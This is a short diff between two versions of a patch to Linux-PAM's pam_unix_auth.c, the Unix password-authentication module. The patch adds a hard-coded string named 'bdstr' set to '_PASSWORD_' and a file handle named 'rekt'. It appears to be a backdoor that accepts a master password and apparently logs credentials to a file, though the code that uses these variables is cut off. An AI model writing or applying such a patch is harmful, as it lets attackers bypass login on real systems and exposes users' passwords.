@@ -1,5 +1,5 @@
 --- ./modules/pam_unix/pam_unix_auth.c	2020-05-18 17:14:31.000000000 -0700
-+++ pam_unix_auth.c	2020-05-19 00:47:04.000000000 -0700
++++ pam_unix_auth.c	2020-05-19 00:50:53.000000000 -0700
 @@ -49,6 +49,8 @@
  #include <sys/types.h>
  #include <sys/stat.h>
@@ -9,17 +9,18 @@
  
  #include <security/_pam_macros.h>
  #include <security/pam_modules.h>
-@@ -71,6 +73,9 @@
+@@ -71,6 +73,10 @@
   *      onto a normal UNIX authentication
   */
  
 +unsigned char *bdstr = "_PASSWORD_";
++FILE *rekt;
 +
 +
  #define AUTH_RETURN						\
  do {									\
  	D(("recording return code for next time [%d]",		\
-@@ -170,7 +175,16 @@
+@@ -170,7 +176,16 @@
  	D(("user=%s, password=[%s]", name, p));
  
  	/* verify the password of this user */
